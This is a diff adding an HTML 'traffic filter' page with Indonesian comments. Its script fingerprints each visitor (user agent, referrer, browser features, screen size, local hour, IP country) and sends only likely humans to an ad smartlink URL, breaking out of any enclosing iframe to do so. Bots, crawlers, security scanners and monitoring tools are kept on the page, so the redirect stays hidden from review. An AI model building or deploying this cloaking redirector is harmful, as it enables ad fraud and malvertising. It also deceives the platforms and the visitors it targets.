@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Traffic Filter System</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0;
+            background: transparent;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .container {
+            width: 100%;
+            min-height: 150px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .filter-box {
+            background: rgba(255,255,255,0.95);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            max-width: 350px;
+            width: 90%;
+            text-align: center;
+        }
+        .loading-bar {
+            width: 100%;
+            height: 6px;
+            background: #f0f0f0;
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+        .loading-progress {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #00b09b, #96c93d);
+            transition: width 0.5s ease;
+        }
+        .counter {
+            color: #2c3e50;
+            font-size: 14px;
+            font-weight: 500;
+            margin: 10px 0;
+        }
+        .status {
+            font-size: 13px;
+            padding: 8px;
+            border-radius: 20px;
+            background: #f8f9fa;
+            color: #495057;
+            margin: 10px 0;
+        }
+        .status.bad {
+            background: #fee;
+            color: #c0392b;
+        }
+        .status.good {
+            background: #e8f5e9;
+            color: #27ae60;
+        }
+        .filter-detail {
+            font-size: 11px;
+            color: #7f8c8d;
+            text-align: left;
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 10px;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+        .filter-detail div {
+            padding: 3px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .filter-detail .passed {
+            color: #27ae60;
+        }
+        .filter-detail .failed {
+            color: #c0392b;
+        }
+        .badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: bold;
+            margin-left: 5px;
+        }
+        .badge.bot {
+            background: #c0392b;
+            color: white;
+        }
+        .badge.human {
+            background: #27ae60;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="filter-box" id="filterBox">
+            <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 15px;">
+                <span style="font-size: 16px; font-weight: 600; color: #2c3e50;">🔍 Traffic Filter</span>
+                <span class="badge" id="qualityBadge">Memeriksa...</span>
+            </div>
+            
+            <div class="loading-bar">
+                <div class="loading-progress" id="progress"></div>
+            </div>
+            
+            <div class="counter" id="counter">Menganalisis kualitas traffic...</div>
+            <div class="status" id="status">Memeriksa parameter traffic...</div>
+            
+            <div class="filter-detail" id="filterDetail">
+                <div>⏳ Memeriksa User-Agent...</div>
+                <div>⏳ Memeriksa Referrer...</div>
+                <div>⏳ Memeriksa Browser Features...</div>
+                <div>⏳ Memeriksa Screen Resolution...</div>
+                <div>⏳ Memeriksa Waktu Kunjungan...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // =============== KONFIGURASI ===============
+        const SMARTLINK_URL = "https://oversightexcitement.com/ecpp2d2yf?key=780644cc073355ffdcb57a8c6dbbd9b4"; // GANTI DENGAN URL ANDA
+        
+        // Threshold kualitas - jika skor di bawah ini, traffic dianggap sampah
+        const QUALITY_THRESHOLD = 60; // 0-100, semakin tinggi semakin bagus
+        
+        // Daftar User-Agent bot/sampah (diperluas)
+        const BOT_KEYWORDS = [
+            'bot', 'spider', 'crawler', 'python', 'perl', 'curl', 'wget', 'scrapy',
+            'java', 'php', 'ubuntu', 'headless', 'selenium', 'phantomjs', 'puppeteer',
+            'googlebot', 'bingbot', 'yahoo! slurp', 'duckduckbot', 'baiduspider',
+            'yandexbot', 'facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot',
+            'slurp', 'wordpress', 'scanner', 'survey', 'monitor', 'uptime', 'pingdom',
+            'newrelic', 'datadog', 'ping', 'checker', 'validator', 'feedfetcher',
+            'http client', 'http request', 'axios', 'request.js', 'node-fetch',
+            'go-http-client', 'ruby', 'scalaj-http', 'okhttp', 'python-requests'
+        ];
+        
+        // Daftar referrer yang mencurigakan (sumber traffic sampah)
+        const BAD_REFERRERS = [
+            'claroads', 'adpalladium', 'traffic', 'click', 'popunder', 'popup',
+            'advert', 'banner', 'rotator', 'redirect', 'direct', 'blank', 'about:blank',
+            'localhost', '127.0.0.1', 'test', 'demo', 'sample', 'example'
+        ];
+        
+        // Daftar negara Tier-3 (CPM rendah) - akan menurunkan skor
+        const LOW_QUALITY_COUNTRIES = ['IN', 'PK', 'ID', 'PH', 'NG', 'BD', 'VN', 'TH', 'EG', 'MA', 'KE', 'GH'];
+        
+        // Resolusi layar yang mencurigakan (terlalu kecil/khas bot/iframe)
+        const SUSPICIOUS_RESOLUTIONS = [
+            { width: 1, height: 1 },
+            { width: 0, height: 0 },
+            { width: 100, height: 100 },
+            { width: 200, height: 200 }
+        ];
+        // ===========================================
+
+        // Fungsi untuk debug
+        function debug(message, data = null) {
+            console.log(`[TrafficFilter] ${message}`, data || '');
+        }
+
+        // Kelas untuk menghitung skor kualitas
+        class TrafficQualityScore {
+            constructor() {
+                this.scores = {};
+                this.details = {};
+                this.totalScore = 100;
+                this.reasons = [];
+            }
+
+            addScore(category, score, reason, passed = true) {
+                this.scores[category] = score;
+                this.details[category] = { score, reason, passed };
+                if (!passed) {
+                    this.totalScore -= score;
+                    this.reasons.push(`${category}: ${reason} (-${score} poin)`);
+                }
+                return this;
+            }
+
+            getScore() {
+                return Math.max(0, this.totalScore);
+            }
+
+            getQuality() {
+                const score = this.getScore();
+                if (score >= 80) return 'PREMIUM';
+                if (score >= 60) return 'STANDARD';
+                if (score >= 40) return 'LOW';
+                return 'TRASH';
+            }
+
+            shouldRedirect() {
+                return this.getScore() >= QUALITY_THRESHOLD;
+            }
+
+            getDetails() {
+                return {
+                    total: this.getScore(),
+                    quality: this.getQuality(),
+                    reasons: this.reasons,
+                    details: this.details
+                };
+            }
+        }
+
+        // Fungsi untuk mendapatkan negara dari IP
+        async function getCountryFromIP() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                if (response.ok) {
+                    const data = await response.json();
+                    return {
+                        countryCode: data.country_code,
+                        country: data.country_name,
+                        ip: data.ip
+                    };
+                }
+            } catch (e) {
+                debug('Gagal mendapatkan lokasi:', e);
+            }
+            return null;
+        }
+
+        // Fungsi untuk memeriksa browser features
+        function checkBrowserFeatures() {
+            const features = {
+                cookies: navigator.cookieEnabled,
+                localStorage: typeof localStorage !== 'undefined',
+                sessionStorage: typeof sessionStorage !== 'undefined',
+                webGL: false,
+                canvas: false,
+                webRTC: false
+            };
+
+            // Cek WebGL
+            try {
+                const canvas = document.createElement('canvas');
+                features.webGL = !!(window.WebGLRenderingContext && 
+                    (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
+            } catch (e) {}
+
+            // Cek Canvas
+            try {
+                const canvas = document.createElement('canvas');
+                features.canvas = !!(canvas.getContext && canvas.getContext('2d'));
+            } catch (e) {}
+
+            // Cek WebRTC
+            features.webRTC = !!(window.RTCPeerConnection || window.webkitRTCPeerConnection);
+
+            return features;
+        }
+
+        // Fungsi untuk memeriksa waktu kunjungan
+        function checkVisitTime() {
+            const hour = new Date().getHours();
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            return {
+                hour,
+                timezone,
+                isBusinessHours: hour >= 8 && hour <= 22,
+                isLateNight: hour <= 4 || hour >= 23
+            };
+        }
+
+        // Fungsi utama filter traffic
+        async function analyzeTraffic() {
+            const qualityScore = new TrafficQualityScore();
+            const updateStatus = (id, status, message, passed) => {
+                const detailEl = document.getElementById('filterDetail');
+                if (detailEl) {
+                    const divs = detailEl.getElementsByTagName('div');
+                    if (divs[id]) {
+                        divs[id].innerHTML = passed ? 
+                            `✅ ${message}` : 
+                            `❌ ${message}`;
+                        divs[id].className = passed ? 'passed' : 'failed';
+                    }
+                }
+            };
+
+            // 1. CEK USER-AGENT (bobot 30)
+            const ua = navigator.userAgent.toLowerCase();
+            debug('User-Agent:', ua);
+            
+            let isBot = false;
+            let botKeyword = '';
+            for (let keyword of BOT_KEYWORDS) {
+                if (ua.includes(keyword.toLowerCase())) {
+                    isBot = true;
+                    botKeyword = keyword;
+                    break;
+                }
+            }
+            
+            if (isBot) {
+                qualityScore.addScore('userAgent', 30, `Terdeteksi bot: ${botKeyword}`, false);
+                updateStatus(0, 'failed', `Bot terdeteksi (${botKeyword})`, false);
+            } else if (ua.length < 20) {
+                qualityScore.addScore('userAgent', 30, 'User-Agent terlalu pendek', false);
+                updateStatus(0, 'failed', 'User-Agent mencurigakan (terlalu pendek)', false);
+            } else {
+                updateStatus(0, 'passed', 'User-Agent normal', true);
+            }
+
+            // 2. CEK REFERRER (bobot 20)
+            const referrer = document.referrer.toLowerCase();
+            debug('Referrer:', referrer);
+            
+            let isBadReferrer = false;
+            if (!referrer || referrer === '') {
+                qualityScore.addScore('referrer', 20, 'No referrer (direct/iframe)', false);
+                updateStatus(1, 'failed', 'Tidak ada referrer (traffic iframe)', false);
+            } else {
+                for (let bad of BAD_REFERRERS) {
+                    if (referrer.includes(bad)) {
+                        isBadReferrer = true;
+                        qualityScore.addScore('referrer', 20, `Referrer mencurigakan: ${bad}`, false);
+                        updateStatus(1, 'failed', `Referrer dari sumber sampah (${bad})`, false);
+                        break;
+                    }
+                }
+                if (!isBadReferrer) {
+                    updateStatus(1, 'passed', `Referrer: ${referrer.substring(0, 30)}...`, true);
+                }
+            }
+
+            // 3. CEK BROWSER FEATURES (bobot 25)
+            const features = checkBrowserFeatures();
+            debug('Browser Features:', features);
+            
+            let featureScore = 0;
+            let missingFeatures = [];
+            
+            if (!features.cookies) {
+                featureScore += 10;
+                missingFeatures.push('cookies');
+            }
+            if (!features.localStorage) {
+                featureScore += 5;
+                missingFeatures.push('localStorage');
+            }
+            if (!features.sessionStorage) {
+                featureScore += 5;
+                missingFeatures.push('sessionStorage');
+            }
+            if (!features.webGL) {
+                featureScore += 3;
+                missingFeatures.push('WebGL');
+            }
+            if (!features.canvas) {
+                featureScore += 2;
+                missingFeatures.push('Canvas');
+            }
+            
+            if (featureScore > 0) {
+                qualityScore.addScore('browserFeatures', featureScore, `Missing features: ${missingFeatures.join(', ')}`, false);
+                updateStatus(2, 'failed', `Browser terbatas (${missingFeatures.length} fitur hilang)`, false);
+            } else {
+                updateStatus(2, 'passed', 'Browser features lengkap', true);
+            }
+
+            // 4. CEK SCREEN RESOLUTION (bobot 15)
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            debug('Screen Resolution:', `${screenWidth}x${screenHeight}`);
+            
+            let isSuspiciousScreen = false;
+            for (let res of SUSPICIOUS_RESOLUTIONS) {
+                if (screenWidth <= res.width && screenHeight <= res.height) {
+                    isSuspiciousScreen = true;
+                    qualityScore.addScore('screen', 15, `Resolusi mencurigakan: ${screenWidth}x${screenHeight}`, false);
+                    updateStatus(3, 'failed', `Resolusi terlalu kecil (${screenWidth}x${screenHeight})`, false);
+                    break;
+                }
+            }
+            
+            if (!isSuspiciousScreen) {
+                if (screenWidth < 800) {
+                    qualityScore.addScore('screen', 5, 'Resolusi kecil (mobile/iframe)', false);
+                    updateStatus(3, 'failed', `Resolusi kecil (${screenWidth}x${screenHeight})`, true);
+                } else {
+                    updateStatus(3, 'passed', `Resolusi normal (${screenWidth}x${screenHeight})`, true);
+                }
+            }
+
+            // 5. CEK WAKTU KUNJUNGAN (bobot 10)
+            const visitTime = checkVisitTime();
+            debug('Visit Time:', visitTime);
+            
+            if (visitTime.isLateNight) {
+                qualityScore.addScore('visitTime', 10, 'Kunjungan jam tidak wajar (late night)', false);
+                updateStatus(4, 'failed', 'Jam tidak wajar (potensi bot)', false);
+            } else {
+                updateStatus(4, 'passed', `Waktu normal (${visitTime.hour}:00)`, true);
+            }
+
+            // 6. CEK LOKASI (tambahan, async)
+            try {
+                const geoData = await getCountryFromIP();
+                debug('Geo Data:', geoData);
+                
+                if (geoData && LOW_QUALITY_COUNTRIES.includes(geoData.countryCode)) {
+                    qualityScore.addScore('country', 20, `Negara Tier-3: ${geoData.country}`, false);
+                    const detailEl = document.getElementById('filterDetail');
+                    if (detailEl) {
+                        const newDiv = document.createElement('div');
+                        newDiv.innerHTML = `❌ Negara Tier-3: ${geoData.country}`;
+                        newDiv.className = 'failed';
+                        detailEl.appendChild(newDiv);
+                    }
+                }
+            } catch (e) {
+                debug('Gagal cek lokasi:', e);
+            }
+
+            return qualityScore;
+        }
+
+        // Fungsi utama
+        async function init() {
+            const progressEl = document.getElementById('progress');
+            const counterEl = document.getElementById('counter');
+            const statusEl = document.getElementById('status');
+            const qualityBadge = document.getElementById('qualityBadge');
+            
+            // Analisis traffic
+            counterEl.textContent = '🔍 Menganalisis kualitas traffic...';
+            statusEl.textContent = 'Memeriksa parameter...';
+            
+            const qualityScore = await analyzeTraffic();
+            const result = qualityScore.getDetails();
+            
+            debug('Hasil Analisis:', result);
+            
+            // Update tampilan berdasarkan hasil
+            if (qualityScore.shouldRedirect()) {
+                // Traffic BAGUS - akan redirect
+                qualityBadge.textContent = 'TRAFFIC BAGUS';
+                qualityBadge.className = 'badge human';
+                statusEl.className = 'status good';
+                statusEl.textContent = `✅ Kualitas: ${result.quality} (Skor: ${result.total})`;
+                
+                counterEl.textContent = '⏳ Traffic berkualitas, mengalihkan...';
+                
+                // Progress bar animation
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += 33;
+                    progressEl.style.width = progress + '%';
+                    
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        
+                        // Redirect ke smartlink
+                        setTimeout(() => {
+                            const finalUrl = SMARTLINK_URL.includes('?') 
+                                ? `${SMARTLINK_URL}&quality_score=${result.total}&quality=${result.quality}&ts=${Date.now()}`
+                                : `${SMARTLINK_URL}?quality_score=${result.total}&quality=${result.quality}&ts=${Date.now()}`;
+                            
+                            try {
+                                if (window.top !== window.self) {
+                                    window.top.location.href = finalUrl;
+                                } else {
+                                    window.location.href = finalUrl;
+                                }
+                            } catch (e) {
+                                window.location.href = finalUrl;
+                            }
+                        }, 500);
+                    }
+                }, 500);
+                
+            } else {
+                // Traffic SAMPAH - JANGAN redirect
+                qualityBadge.textContent = 'TRAFFIC SAMPAH';
+                qualityBadge.className = 'badge bot';
+                statusEl.className = 'status bad';
+                statusEl.textContent = `❌ Kualitas: ${result.quality} (Skor: ${result.total}) - DITOLAK`;
+                
+                counterEl.textContent = '⛔ Traffic berkualitas rendah, tidak dialihkan';
+                
+                // Progress bar merah
+                progressEl.style.background = 'linear-gradient(90deg, #e74c3c, #c0392b)';
+                progressEl.style.width = '100%';
+                
+                // Tampilkan alasan penolakan
+                const detailEl = document.getElementById('filterDetail');
+                const reasonsDiv = document.createElement('div');
+                reasonsDiv.style.marginTop = '15px';
+                reasonsDiv.style.padding = '10px';
+                reasonsDiv.style.background = '#fee';
+                reasonsDiv.style.borderRadius = '5px';
+                reasonsDiv.style.fontSize = '11px';
+                reasonsDiv.style.color = '#c0392b';
+                reasonsDiv.innerHTML = '<strong>❌ Alasan ditolak:</strong><br>' + 
+                    result.reasons.map(r => '• ' + r).join('<br>');
+                detailEl.appendChild(reasonsDiv);
+                
+                // JANGAN redirect ke smartlink
+                // Biarkan pengunjung stuck di halaman ini
+            }
+        }
+
+        // Mulai ketika halaman selesai dimuat
+        window.addEventListener('load', init);
+    </script>
+</body>
+</html>
